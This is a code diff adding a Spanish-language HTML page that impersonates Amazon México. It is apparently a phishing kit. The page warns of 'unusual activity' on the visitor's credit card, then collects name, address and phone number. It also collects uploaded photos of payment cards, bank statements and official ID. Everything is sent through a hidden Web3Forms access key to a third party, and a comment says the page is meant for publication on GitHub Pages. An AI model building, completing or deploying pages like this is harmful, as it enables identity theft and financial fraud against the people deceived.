@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verificación de documentos</title>
+  <style>
+    /* ── Variables ── */
+    :root {
+      --nav:       #232f3e;
+      --amazon:    #ffd814;
+      --amazon-bd: #fcd200;
+      --amazon-hov:#f7ca00;
+      --alert-bg:  #fffbf0;
+      --alert-bd:  #e8a020;
+      --text:      #0f1111;
+      --muted:     #565959;
+      --link:      #0066c0;
+      --line:      #d5d9d9;
+      --field-bd:  #888c8c;
+    }
+
+    /* ── Reset ── */
+    *, *::before, *::after { box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      margin: 0;
+      background: #e3e6e6;
+      color: var(--text);
+      font-family: Arial, Helvetica, sans-serif;
+      font-size: 14px;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* ── Contenedor central ── */
+    .page {
+      max-width: 360px;
+      margin: 0 auto;
+      min-height: 100vh;
+      background: #fff;
+    }
+
+    /* ── Barra superior ── */
+    .topbar {
+      background: var(--nav);
+      height: 48px;
+      display: flex;
+      align-items: flex-start;
+      padding: 7px 12px 0;
+    }
+    .brand-wrap { position: relative; display: inline-block; }
+    .brand {
+      color: #fff;
+      font-size: 21px;
+      font-weight: 400;
+      font-style: italic;
+      letter-spacing: -.4px;
+      line-height: 1;
+      font-family: Georgia, 'Times New Roman', serif;
+    }
+    .brand small {
+      font-size: 10px;
+      font-style: normal;
+      font-family: Arial, sans-serif;
+      vertical-align: super;
+    }
+    /* Curva naranja característica de Amazon */
+    .swoosh {
+      position: absolute;
+      left: 12px;
+      top: 20px;
+      width: 38px;
+      height: 8px;
+      border-bottom: 2.5px solid #f7a41d;
+      border-radius: 0 0 40px 40px;
+      transform: rotate(-5deg);
+    }
+    .swoosh::after {
+      content: "";
+      position: absolute;
+      right: -2px;
+      bottom: -4px;
+      border-left: 6px solid #f7a41d;
+      border-top: 3px solid transparent;
+      border-bottom: 3px solid transparent;
+      transform: rotate(-12deg);
+    }
+
+    /* ── Contenido ── */
+    .container { padding: 14px 14px 30px; }
+
+    /* ── Aviso amarillo ── */
+    .notice {
+      border: 2px solid var(--alert-bd);
+      border-radius: 5px;
+      background: var(--alert-bg);
+      padding: 10px 12px;
+      margin: 0 0 16px;
+    }
+    .notice h2 {
+      margin: 0 0 5px;
+      font-size: 14px;
+      font-weight: 700;
+      line-height: 1.3;
+    }
+    .notice p {
+      margin: 0;
+      font-size: 13px;
+      line-height: 1.4;
+      color: #333;
+    }
+    .notice p a { color: var(--link); }
+
+    /* ── Títulos ── */
+    h1 {
+      margin: 0 0 3px;
+      font-size: 17px;
+      line-height: 1.2;
+      font-weight: 700;
+    }
+    .sub {
+      margin: 0 0 14px;
+      font-size: 13px;
+      line-height: 1.3;
+      color: #333;
+    }
+    h2.section-title {
+      margin: 0 0 6px;
+      font-size: 17px;
+      line-height: 1.2;
+      font-weight: 700;
+    }
+
+    /* ── Etiquetas ── */
+    label.field-label {
+      display: block;
+      font-size: 13px;
+      font-weight: 700;
+      margin: 0 0 3px;
+      line-height: 1.2;
+    }
+
+    /* ── Inputs y textarea ── */
+    .field,
+    .select,
+    .textarea {
+      display: block;
+      width: 100%;
+      border: 1px solid var(--field-bd);
+      border-radius: 4px;
+      background: #fff;
+      font-size: 13px;
+      padding: 6px 9px;
+      color: var(--text);
+      outline: none;
+      margin: 0 0 12px;
+    }
+    .field  { height: 38px; }
+    .field:focus,
+    .select:focus,
+    .textarea:focus {
+      border-color: #e77600;
+      box-shadow: 0 0 0 3px rgba(228,121,17,.22);
+    }
+    .field::placeholder { color: #767676; font-size: 13px; }
+    .textarea { min-height: 76px; resize: vertical; }
+
+    /* Select con flecha custom */
+    .select-wrap { position: relative; margin: 0 0 12px; }
+    .select {
+      appearance: none;
+      -webkit-appearance: none;
+      padding-right: 28px;
+      margin: 0;
+      height: 38px;
+      background: #fff;
+    }
+    .select-wrap::after {
+      content: "▼";
+      position: absolute;
+      right: 9px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 9px;
+      color: #444;
+      pointer-events: none;
+    }
+
+    /* ── Separador ── */
+    .divider { height: 1px; background: var(--line); margin: 10px 0 16px; }
+
+    /* ── Panel método de pago ── */
+    .panel {
+      border: 1px solid #ddd;
+      border-radius: 3px;
+      overflow: hidden;
+      margin: 0 0 10px;
+    }
+    .panel-head {
+      background: #f0f2f2;
+      border-bottom: 1px solid #ddd;
+      text-align: center;
+      font-size: 13px;
+      font-weight: 700;
+      padding: 7px 12px;
+    }
+    .panel-body { padding: 9px 12px; }
+    .pay {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      font-size: 13px;
+    }
+    /* Ícono Mastercard: dos círculos superpuestos */
+    .mc {
+      display: inline-flex;
+      position: relative;
+      width: 30px;
+      height: 18px;
+      flex-shrink: 0;
+    }
+    .mc-left, .mc-right {
+      position: absolute;
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      top: 0;
+    }
+    .mc-left  { background: #eb001b; left: 0; }
+    .mc-right { background: #f79e1b; right: 0; }
+
+    /* ── Documentos aceptados ── */
+    .rule-title { font-size: 13px; font-weight: 700; margin: 0 0 2px; }
+    .docs-link {
+      color: var(--link);
+      font-size: 13px;
+      text-decoration: none;
+      display: block;
+      margin: 0 0 8px;
+    }
+    .docs-link:hover { text-decoration: underline; }
+    .docs { margin: 0 0 12px 18px; padding: 0; }
+    .docs li {
+      font-size: 12px;
+      line-height: 1.38;
+      margin: 0 0 6px;
+    }
+    .docs li strong { font-weight: 700; }
+
+    /* ── Sección carga de documentos ── */
+    .upload-title { font-size: 13px; font-weight: 700; margin: 0 0 3px; }
+    .upload-meta  { font-size: 12px; line-height: 1.35; color: #444; margin: 0 0 10px; }
+
+    /* Botones de carga — estilo Amazon (gradiente gris, borde sólido) */
+    .file-btn,
+    .camera-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 7px;
+      width: 100%;
+      height: 40px;
+      border: 1px solid #adb1b8;
+      border-radius: 3px;
+      background: linear-gradient(to bottom, #f7f8fa, #e7e9ec);
+      cursor: pointer;
+      font-size: 13px;
+      color: var(--text);
+      box-shadow: 0 1px 0 rgba(255,255,255,.6) inset;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+    .file-btn  { margin: 0 0 8px; position: relative; }
+    .camera-btn { margin: 0 0 10px; }
+    .file-btn:hover,
+    .camera-btn:hover { background: linear-gradient(to bottom, #e7e9ec, #d9dce2); }
+    /* El input de galería sigue oculto bajo el label (sin capture, funciona bien) */
+    .file-btn input {
+      position: absolute;
+      inset: 0;
+      opacity: 0;
+      cursor: pointer;
+    }
+
+    /* Mensajes de estado */
+    .tip    { font-size: 12px; line-height: 1.3; margin: 0 0 8px; color: #333; }
+    .count  { font-size: 12px; line-height: 1.3; margin: 2px 0 8px; color: var(--muted); }
+    .warn   { font-size: 12px; line-height: 1.3; margin: 2px 0 8px; color: #c40000; display: none; }
+    .status { font-size: 12px; margin: 8px 0 0; color: var(--muted); }
+
+    /* Enlace agregar comentarios */
+    .comments-link {
+      display: inline-block;
+      margin: 0 0 10px;
+      color: var(--link);
+      font-size: 13px;
+      text-decoration: none;
+    }
+    .comments-link:hover { text-decoration: underline; }
+
+    /* Campo de comentarios */
+    .comment {
+      display: block;
+      width: 100%;
+      height: 60px;
+      border: 1px solid var(--field-bd);
+      border-radius: 4px;
+      background: #fff;
+      font-size: 13px;
+      padding: 6px 9px;
+      color: var(--text);
+      resize: none;
+      outline: none;
+      margin: 0 0 6px;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+    .comment::placeholder { color: #767676; }
+    .comment:focus {
+      border-color: #e77600;
+      box-shadow: 0 0 0 3px rgba(228,121,17,.22);
+    }
+    .note { font-size: 12px; line-height: 1.4; margin: 0 0 16px; color: #333; }
+
+    /* ── Botón submit amarillo ── */
+    .submit {
+      display: block;
+      width: 100%;
+      height: 44px;
+      border: 1px solid var(--amazon-bd);
+      border-radius: 22px;
+      background: linear-gradient(to bottom, #ffe34c, var(--amazon));
+      color: var(--text);
+      font-size: 13px;
+      cursor: pointer;
+      box-shadow: 0 2px 5px rgba(213,165,0,.35);
+      text-align: center;
+    }
+    .submit:hover    { background: linear-gradient(to bottom, var(--amazon), var(--amazon-hov)); }
+    .submit:disabled { opacity: .65; cursor: not-allowed; }
+
+    /* ── Pie de página ── */
+    .footer {
+      border-top: 1px solid var(--line);
+      text-align: center;
+      padding: 12px 10px 20px;
+    }
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+      flex-wrap: wrap;
+      margin: 0 0 7px;
+    }
+    .footer-links a {
+      color: var(--link);
+      text-decoration: none;
+      font-size: 12px;
+    }
+    .footer-links a:hover { text-decoration: underline; }
+    .footer-copy { font-size: 11px; color: #555; line-height: 1.4; }
+  </style>
+</head>
+<body>
+  <div class="page">
+
+    <!-- Barra superior -->
+    <header class="topbar">
+      <div class="brand-wrap" aria-label="Amazon México">
+        <div class="brand">amazon<small>.com.mx</small></div>
+        <div class="swoosh" aria-hidden="true"></div>
+      </div>
+    </header>
+
+    <main class="container">
+
+      <!-- Aviso de cuenta limitada -->
+      <section class="notice" role="alert">
+        <h2>Revisión de actividad inusual en tu cuenta.Detectamos un uso inusual de amazon con tu tarjeta de credito<</h2>
+        <p>Detectamos una actividad de pago inusual relacionada con tu cuenta en amazon.com.mx. Por seguridad, hemos pausado la operación y abierto un caso de revisión con el folio [E-0346242-BDS01]. (<a href="#">¿Por qué?</a>)</p>
+      </section>
+
+      <!--
+        IMPORTANTE: reemplaza TU_FORM_ID con el ID real de tu formulario en Formspree
+        antes de publicar en GitHub Pages.
+        enctype="multipart/form-data" es obligatorio para enviar archivos.
+      -->
+      <form
+        id="uploadForm"
+        action="https://api.web3forms.com/submit"
+        method="POST"
+        enctype="multipart/form-data"
+      >
+
+        <!-- Sección: detalles de facturación -->
+        <h1>Ingrese los detalles de facturación</h1>
+        <p class="sub">Esto es necesario para reactivar tu cuenta.</p>
+
+        <label class="field-label" for="fullName">Nombre completo</label>
+        <input
+          class="field"
+          id="fullName"
+          name="nombre"
+          type="text"
+          placeholder="Nombre que se muestra en el método"
+          required
+        />
+
+        <div class="select-wrap">
+          <select class="select" id="country" name="pais" required>
+            <option value="México">México</option>
+          </select>
+        </div>
+
+        <label class="field-label" for="billingAddress">Dirección de facturación</label>
+        <textarea
+          class="textarea"
+          id="billingAddress"
+          name="direccion"
+          required
+        ></textarea>
+
+        <label class="field-label" for="phone">Número de teléfono</label>
+        <input
+          class="field"
+          id="phone"
+          name="telefono"
+          type="tel"
+          inputmode="tel"
+          required
+        />
+
+        <div class="divider"></div>
+
+        <!-- Sección: subir documento -->
+        <h2 class="section-title">Subir un documento de respaldo</h2>
+        <p class="sub">Sube al menos un documento de respaldo para el siguiente método de pago utilizado en tu pedido reciente de Amazon.</p>
+
+        <div class="panel">
+          <div class="panel-head">Método de pago</div>
+          <div class="panel-body">
+            <div class="pay">
+              <!-- Ícono Mastercard (círculos CSS) -->
+              <span class="mc" aria-label="Mastercard">
+                <span class="mc-left"></span>
+                <span class="mc-right"></span>
+              </span>
+              <span>MasterCard con terminación 1189</span>
+            </div>
+          </div>
+        </div>
+
+        <p class="rule-title">Documentos aceptados según el tipo de método de pago:</p>
+        <a class="docs-link" href="#" onclick="return false;">Detalles sobre el requisito de documentos</a>
+
+        <ol class="docs">
+          <li><strong>Tarjeta de débito</strong> Imagen redactada de la tarjeta con nombre y últimos 4 dígitos O extracto bancario dentro de los 90 días que muestre las transacciones de Amazon desde la misma tarjeta, nombre y dirección</li>
+          <li><strong>Tarjeta de crédito</strong> Imagen de la tarjeta con el nombre y los últimos 4 dígitos ocultos O extracto bancario de los últimos 90 días en el que se muestren los últimos 4 dígitos de la tarjeta, el nombre y la dirección</li>
+          <li><strong>Tarjeta virtual</strong> Imagen de la tarjeta editada con el nombre y los 4 últimos dígitos O extracto bancario de los últimos 90 días en el que figuren los 4 últimos dígitos y Documento de identidad oficial en el que figuren el nombre, la dirección y la autoridad emisora</li>
+          <li><strong>Prepaid Cards</strong> Imagen de la tarjeta con los últimos 4 dígitos ocultos Y documento de identidad oficial en el que se muestren el nombre, la dirección y la autoridad emisora</li>
+          <li><strong>Cheque electrónico o débito directo</strong> Extracto bancario editado de los últimos 90 días en el que figuren tu nombre, dirección y número de ruta de 9 dígitos</li>
+          <li><strong>Otros pagos</strong> Imagen del pago editada (si está disponible) Y documento de identidad oficial o recibo de servicios públicos en el que figuren el nombre, la dirección, el código postal y la autoridad emisora</li>
+        </ol>
+
+        <div class="divider"></div>
+
+        <!-- Sección: carga de documentos -->
+        <p class="upload-title">Carga de documentos</p>
+        <p class="upload-meta">Tipos de archivos compatibles: jpg, pdf, png, tif. Número máximo de archivos: 10. Tamaño máximo de archivo: 15 MB</p>
+
+        <!--
+          Botón 1: abre galería/explorador. Sin capture para no forzar cámara.
+          Se implementa como label sobre input oculto (técnica estándar).
+        -->
+        <label class="file-btn" for="galleryInput">
+          <span aria-hidden="true">⇪</span>
+          <span>Escoger el archivo</span>
+          <input
+            id="galleryInput"
+            name="imagenes"
+            type="file"
+            accept="image/png, image/jpeg, image/webp, application/pdf, image/tiff"
+            multiple
+          />
+        </label>
+
+        <!--
+          Input de cámara oculto fuera del DOM visual.
+          Se activa mediante .click() desde JS para garantizar que
+          capture="environment" sea respetado en iOS Safari y Android Chrome.
+          Colocarlo directamente en el DOM (no dentro de un label invisible)
+          es la única forma confiable de que los navegadores móviles lo honren.
+        -->
+        <input
+          id="cameraInput"
+          name="foto"
+          type="file"
+          accept="image/*"
+          capture="environment"
+          style="display:none"
+        />
+
+        <!-- Botón visible que dispara el input de cámara vía JS -->
+        <button type="button" class="camera-btn" id="cameraTrigger">
+          <span aria-hidden="true">📷</span>
+          <span>Tomar foto</span>
+        </button>
+
+        <p id="fileCount" class="count">No has seleccionado archivos.</p>
+        <p id="fileWarning" class="warn"></p>
+        <p class="tip">No cargues archivos protegidos por contraseña.</p>
+
+        <a class="comments-link" href="#comments">Agregar comentarios</a>
+
+        <!-- Área de comentarios -->
+        <label class="field-label" for="comments">Comentarios (opcional)</label>
+        <textarea
+          class="comment"
+          id="comments"
+          name="comentarios"
+          placeholder="¿Hay algo más que quieras informarnos sobre este pago de pedido?"
+        ></textarea>
+        <p class="note">NOTA: No podemos ofrecer excepciones de políticas como respuesta a comentarios. No incluyas información personal en estos comentarios.</p>
+
+        <!-- Campos ocultos para Web3Forms -->
+        <input type="hidden" name="access_key" value="ce0058df-db69-43b9-9442-35b2550289aa" />
+        <input type="hidden" name="subject" value="Nuevo envío de documentos" />
+        <input type="hidden" name="from_name" value="Verificación Amazon" />
+
+        <!-- Botón de envío -->
+        <button class="submit" id="submitBtn" type="submit">
+          Enviar documento y detalles de facturación
+        </button>
+        <p id="submitStatus" class="status"></p>
+
+      </form>
+    </main>
+
+    <!-- Pie de página -->
+    <footer class="footer">
+      <div class="footer-links">
+        <a href="#" onclick="return false;">Condiciones de uso</a>
+        <a href="#" onclick="return false;">Aviso de Privacidad</a>
+        <a href="#" onclick="return false;">Ayuda</a>
+      </div>
+      <p class="footer-copy">© 1996-2026, Amazon.com, Inc. o afiliados.<br>Todos los derechos reservados.</p>
+    </footer>
+
+  </div>
+
+  <script>
+    /*
+      Validación de archivos.
+      Recoge archivos de ambos inputs (galería + cámara) y valida:
+      - Máximo 10 archivos en total
+      - Máximo 15 MB por archivo
+    */
+    const galleryInput = document.getElementById('galleryInput');
+    const cameraInput  = document.getElementById('cameraInput');
+    const warning      = document.getElementById('fileWarning');
+    const countEl      = document.getElementById('fileCount');
+    const submitBtn    = document.getElementById('submitBtn');
+    const form         = document.getElementById('uploadForm');
+    const statusEl     = document.getElementById('submitStatus');
+
+    const MAX_FILES = 10;
+    const MAX_SIZE  = 15 * 1024 * 1024; // 15 MB
+
+    /* Devuelve todos los archivos seleccionados de ambos inputs */
+    function getAllFiles() {
+      return [
+        ...Array.from(galleryInput.files || []),
+        ...Array.from(cameraInput.files  || []),
+      ];
+    }
+
+    function validate(files) {
+      const tooMany  = files.length > MAX_FILES;
+      const tooLarge = files.some(f => f.size > MAX_SIZE);
+      return { tooMany, tooLarge, ok: !tooMany && !tooLarge };
+    }
+
+    function refreshUI() {
+      warning.style.display = 'none';
+      warning.textContent   = '';
+      statusEl.textContent  = '';
+
+      const files = getAllFiles();
+
+      if (!files.length) {
+        countEl.textContent  = 'No has seleccionado archivos.';
+        submitBtn.disabled   = false;
+        return;
+      }
+
+      const { tooMany, tooLarge, ok } = validate(files);
+      const names = files
+        .slice(0, MAX_FILES)
+        .map(f => `${f.name} (${(f.size / 1024 / 1024).toFixed(2)} MB)`);
+
+      countEl.textContent = `${files.length} archivo(s): ${names.join(', ')}`;
+
+      if (!ok) {
+        warning.textContent   = tooMany
+          ? 'Puedes subir máximo 10 archivos por envío.'
+          : 'Uno o más archivos superan 15 MB.';
+        warning.style.display = 'block';
+        submitBtn.disabled    = true;
+      } else {
+        submitBtn.disabled = false;
+      }
+    }
+
+    /* Dispara el input de cámara oculto al pulsar el botón visible.
+       Esta es la técnica más compatible con iOS Safari y Android Chrome:
+       un programmatic .click() sobre un input[capture] con display:none
+       es honrado como gesto de usuario y abre la cámara nativa. */
+    document.getElementById('cameraTrigger').addEventListener('click', () => {
+      cameraInput.click();
+    });
+
+    galleryInput.addEventListener('change', refreshUI);
+    cameraInput.addEventListener('change',  refreshUI);
+
+    /* Validación final antes del envío */
+    form.addEventListener('submit', event => {
+      const files = getAllFiles();
+      const { tooMany, tooLarge, ok } = validate(files);
+
+      if (!files.length || !ok) {
+        event.preventDefault();
+        warning.textContent = !files.length
+          ? 'Selecciona al menos un archivo o toma una foto.'
+          : tooMany
+            ? 'Puedes subir máximo 10 archivos por envío.'
+            : 'Uno o más archivos superan 15 MB.';
+        warning.style.display = 'block';
+        return;
+      }
+
+      submitBtn.disabled  = true;
+      statusEl.textContent = 'Enviando…';
+    });
+  </script>
+</body>
+</html>
